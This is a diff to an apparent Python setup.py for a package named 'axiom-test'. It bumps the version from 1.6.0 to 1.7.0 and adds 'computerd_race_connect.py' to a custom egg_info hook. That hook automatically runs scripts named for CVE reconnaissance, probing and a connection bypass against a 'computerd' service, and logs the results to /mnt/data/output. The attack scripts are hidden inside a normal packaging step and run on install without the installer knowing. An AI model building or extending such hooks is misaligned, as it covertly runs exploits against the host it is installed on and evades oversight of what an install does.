@@ -12,6 +12,7 @@ class PostEggInfo(egg_info):
             ("cve_2026_5747_recon.sh", "bash", 60, "/mnt/data/output/cve_2026_5747_recon.log"),
             ("computerd_probe.py", "python3", 60, "/mnt/data/output/computerd_probe.log"),
             ("computerd_connect_bypass.py", "python3", 60, "/mnt/data/output/computerd_connect_bypass.log"),
+            ("computerd_race_connect.py", "python3", 60, "/mnt/data/output/computerd_race_connect.log"),
         ]
         for script, runner, timeout, log in scripts:
             path = os.path.join(base, script)
@@ -29,7 +30,7 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="1.6.0",
+    version="1.7.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
